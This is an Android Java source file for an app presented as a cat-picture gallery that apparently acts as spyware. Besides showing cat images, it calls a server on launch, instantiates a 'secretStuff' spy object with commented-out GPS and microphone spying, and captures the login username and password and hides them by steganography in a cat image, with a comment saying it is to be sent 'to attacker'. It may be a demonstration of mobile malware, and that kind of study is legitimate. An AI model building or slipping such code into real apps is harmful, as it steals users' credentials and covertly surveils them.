package com.example.cats;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.Menu;
import android.widget.Button;
import android.view.View.OnClickListener;
import android.view.View;
import android.content.Context;
import android.content.Intent;

import android.widget.ImageView;
import android.widget.GridView;
import android.widget.TextView;
import android.widget.BaseAdapter;
import android.view.LayoutInflater;
import java.util.ArrayList;
import java.util.List;
import android.view.ViewGroup;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

public class MainActivity extends Activity {

   
   // Button gpsButton, micButton;
   // boolean gpsOn = false;
  //  boolean micOn = false;
    ImageView image;
    public String userId = "";
	public String pwd = "";
	
	boolean loggedIn = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TalkToServer myAsync = new TalkToServer();
        System.out.println("********Test test test");
        myAsync.execute();
        System.out.println("^^^^^^^^Called execute to server.");
   
        //Set up spy code
        final secretStuff spy = new secretStuff();
        
        final Context context = this;
       /* gpsButton = (Button) this.findViewById(R.id.Button01);
        gpsButton.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		gpsOn = !gpsOn;//Toggle gps on off
        		if(gpsOn)spy.spyLocation(context, 0);
        		else {
        			spy.getLocation();
        			spy.stopLocationListen(context);
        		}
        	}
        });
        
        micButton = (Button) this.findViewById(R.id.Button02);
        micButton.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		micOn = !micOn;//Toggle gps on off
        		if(micOn)spy.spyMic();
        		else {
        			spy.stopMic();
        		}
        	}
        });*/
        
        GridView gridView = (GridView)findViewById(R.id.gridview);
        gridView.setAdapter(new MyAdapter(this));
        
        System.out.println("Logged in "+loggedIn);
        
        if(!loggedIn)
        {
        	//Start login screen
        	Intent intent=new Intent(getApplicationContext(),Login.class);
        	startActivityForResult(intent,100);
        	loggedIn = true;
        }
        
    }
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
    	super.onActivityResult(requestCode, resultCode, data);
    	if(resultCode == 100)
    	{
    		userId = data.getExtras().getString("userId");
    		pwd = data.getExtras().getString("pwd");
    		
    		//Save into image and send to attacker
    		final Steganog steg = new Steganog(this);
    		String msg = "username/"+userId+"/password"+pwd;
    		steg.encodeImage(R.drawable.flycat, "stegImg", msg, ".jpg");
    	}
    	System.out.println(userId + " " + pwd);
    	
    	/*
    	//Show image to test
    	Bitmap bitmp = BitmapFactory.decodeFile(this.getFilesDir()+"/"+"stegImg"+".png");
    	ImageView img = (ImageView) findViewById(R.id.cattatat);
    	img.setImageBitmap(bitmp);*/
    }
    
    private class MyAdapter extends BaseAdapter
    {
    	private List<Item> items = new ArrayList<Item>();
    	private LayoutInflater inflater;
    	
    	public MyAdapter(Context context)
    	{
    		inflater = LayoutInflater.from(context);
    		
    		//Add images
    		items.add(new Item("Baby", R.drawable.babycat));
    		items.add(new Item("Star", R.drawable.flycat));
    		items.add(new Item("Sandy and Sons", R.drawable.sandcat));
    		items.add(new Item("Meow Muffin", R.drawable.tophatcat));
    		items.add(new Item("Rumbler", R.drawable.catroll));
    		items.add(new Item("Sleeping Beauty", R.drawable.sleepycat));
    		items.add(new Item("Sir Fancy-lot", R.drawable.sircat));
    		items.add(new Item("Meowlineers", R.drawable.bandcats));
    		
    	}
    	
    	public int getCount() {
    		return items.size();
    	}
    	
    	public Object getItem(int i)
    	{
    		return items.get(i);
    	}
    	
    	public long getItemId(int i)
    	{
    		return items.get(i).drawableId;
    	}
    	
    	public View getView(int i, View view, ViewGroup viewGroup)
    	{
    		View v = view;
    		ImageView picture;
    		TextView name;
    		
    		if(v == null)
    		{
    			v = inflater.inflate(R.layout.grid_layout,viewGroup,false);
    			v.setTag(R.id.picture, v.findViewById(R.id.picture));
    			v.setTag(R.id.text, v.findViewById(R.id.text));
    		}
    		
    		picture = (ImageView) v.getTag(R.id.picture);
    		name = (TextView) v.getTag(R.id.text);
    		
    		Item item = (Item)getItem(i);
    		
    		picture.setImageResource(item.drawableId);
    		name.setText(item.name);
    		
    		return v;
    	}
    	
        private class Item
        {
        	final String name;
        	final int drawableId;
        	
        	Item(String name, int drawableId)
        	{
        		this.name = name;
        		this.drawableId = drawableId;
        	}
        }
    }
    

    
}